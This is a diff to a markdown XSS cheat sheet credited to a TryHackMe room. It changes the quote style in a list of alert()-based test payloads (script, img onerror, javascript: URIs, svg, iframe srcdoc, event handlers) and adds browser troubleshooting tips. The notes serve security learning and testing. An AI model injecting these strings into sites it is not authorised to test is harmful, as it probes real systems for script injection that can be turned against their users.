@@ -138,9 +138,15 @@ Taken from: [https://tryhackme.com/r/room/xss](https://tryhackme.com/r/room/xss)
 
 Generally, the following payloads containing different HTML tags can be used to test for the presence of  a XSS vulnerability. Some tag may work, while some may not.&#x20;
 
-For some browsers, the slash in the closing tag may work, while some may not.
+For some browsers, the payload may be interpreted diferrently. Try the following methods to troubleshoot the issue:
 
-Eg. `<img>` vs `<img/>`
+a) Closing slash
+
+Eg. `<img>` and `<img/>`
+
+b) Apostrophe and backtick&#x20;
+
+Eg. ``alert(`xss`)`` and `alert('xss')`
 
 
 
@@ -149,26 +155,26 @@ _**General payloads**_
 1. `<script></script>`
 
 ```html
-<script>alert('yay')</script>
+<script>alert(`yay`)</script>
 ```
 
 2. `<img/>`
 
 ```html
-<img src=x onerror="alert('xss')">
-<img src="javascript:alert('xss')">
+<img src=x onerror="alert(`xss`)">
+<img src="javascript:alert(`xss`)">
 ```
 
 3. `<svg/>`
 
 ```html
-<svg onload="alert('xss')">
+<svg onload="alert(`xss`)">
 ```
 
 4. `<iframe/>`
 
-<pre class="language-html"><code class="lang-html"><strong>&#x3C;iframe src="javascript:alert('xss')">
-</strong>&#x3C;iframe srcdoc="&#x3C;script>alert('xss')&#x3C;/script>">
+<pre class="language-html"><code class="lang-html"><strong>&#x3C;iframe src="javascript:alert(`xss`)">
+</strong>&#x3C;iframe srcdoc="&#x3C;script>alert(`xss`)&#x3C;/script>">
 </code></pre>
 
 5. `<a>`
@@ -180,17 +186,21 @@ _**General payloads**_
 6. `<span>, <br>`
 
 ```html
-<span onmouseover="alert('xss')"></span>
+<span onmouseover="alert(`xss`)"></span>
 <br onmouseover=alert('xss')/>
 ```
 
 7. `<video>`
 
 ```html
-<video onplay="alert('xss')"><source src=x></video>
+<video onplay="alert(`xss`)"><source src=x></video>
 ```
 
 8. `<object/>`
+
+```html
+...
+```
 
 ## Blind XSS payloads
 
